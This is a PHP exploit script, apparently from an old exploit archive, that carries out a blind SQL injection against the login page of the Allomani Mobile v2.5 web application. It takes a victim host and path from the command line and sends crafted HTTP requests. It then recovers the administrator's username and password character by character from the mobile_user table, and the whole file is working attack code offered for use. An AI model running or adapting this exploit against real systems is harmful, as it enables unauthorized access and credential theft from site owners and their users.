@@ -1,0 +1,244 @@
+<?php
+ini_set("max_execution_time",0);
+print_r('
+                                       ||          ||   | ||
+                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
+                               (  :  /    (_)    /           (      .
+
+                                        ___________________
+                                      _/QQQQQQQQQQQQQQQQQQQ\__
+[q] Allomani Mobile v2.5           __/QQQ/````````````````\QQQ\___
+  Blind SQL inj. exploit         _/QQQQQ/                  \QQQQQQ\
+[q] _GET   <3                   /QQQQ/``                    ```QQQQ\
+                               /QQQQ/                          \QQQQ\
+[q] http://allomani.com       |QQQQ/    By  Qabandi             \QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+[/]   -[hai]-                  \QQQQ\                      __  /QQQQ/
+                                \QQQQ\                    /QQ\_QQQQ/
+                                 \QQQQ\                   \QQQQQQQ/
+                                  \QQQQQ\                 /QQQQQ/_
+                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                         ```````````````````     `````
+ ______________________________________________________________________________
+/                                                                              \
+|                 I%00Dont%00Care...                                           |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+');
+
+if ($argc<3) {
+print_r('
+-----------------------------------------------------------------------------
+Usage:   php '.$argv[0].' VICTIM DIR
+
+example: php '.$argv[0].' EXAMPLE /demo/
+
+or if in root dir:
+example: php '.$argv[0].' EXAMPLE //
+
+-----------------------------------------------------------------------------
+');
+die;
+}
+
+
+ function QABANDI($victim,$vic_dir,$inj){
+$host = $victim;
+$p = "http://".$host.$vic_dir;
+$inj = urlencode($inj);
+
+          $packet ="GET ".$p."/login.php?action=login&username=".$inj."&password=ass HTTP/1.1\r\n";
+          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
+          $packet.="Pragma: no-cache\r\n";
+          $packet.="Host: ".$victim."\r\n";
+          $packet.="Connection: Close\r\n\r\n";
+
+           //echo $packet;
+	$o = @fsockopen($host, 80);
+	if(!$o){
+		echo "\n[x] No response...\n";
+		die;
+	}
+	
+	fputs($o, $packet);
+	while (!feof($o)) $data .= fread($o, 1024);
+	fclose($o);
+	
+	$_404 = strstr( $data, "HTTP/1.1 404 Not Found" );
+	if ( !empty($_404) ){
+		echo "\n[x] 404 Not Found... Make sure of path. \n";
+		die;
+	}
+
+                                           return $data;
+
+ } 
+  function QAB_GET($from){
+$content = $from;
+preg_match_all("/<center>([^<]+)<\/center>/",
+    $content,
+    $out, PREG_PATTERN_ORDER);
+
+return  base64_encode($out[1][0]);
+ }
+
+$host1 = $argv[1];
+$userdir1=$argv[2];
+
+$truths = QAB_GET(QABANDI($host1,$userdir1,"' or 1='1"));
+$falses = QAB_GET(QABANDI($host1,$userdir1,"' or 1='2"));
+
+if($truths == $falses){
+  echo "Magic Quotes is on, exploit failed\n";
+  die;
+}
+echo "\n[q]Getting Admin User and Pass";
+echo "\n username: ";
+
+for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),1,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+      for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),2,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+           for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),3,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                   for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),4,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+                          for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),5,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),6,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                           for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),7,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+                      for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select username from mobile_user limit 0,1),8,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+
+
+echo "\n password: ";
+
+for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),1,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+      for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),2,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+           for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),3,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                   for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),4,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+                          for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),5,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),6,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                           for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),7,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+                      for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),8,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+                             for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),9,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                 for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),10,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                      for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),11,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                          for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),12,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+                                              for ($i = 1; $i <= 122; $i++) {
+       $qest = QAB_GET(QABANDI($host1,$userdir1,"' or ascii(substring((select password from mobile_user limit 0,1),13,1))='".$i));
+      if ($qest == $truths) {
+  echo chr($i);
+      }
+}
+
+echo "\n\n this exploit is made to give you the first 8 chars of username and first 13 of password";
+
+?>
+
+# milw0rm.com [2009-07-27]
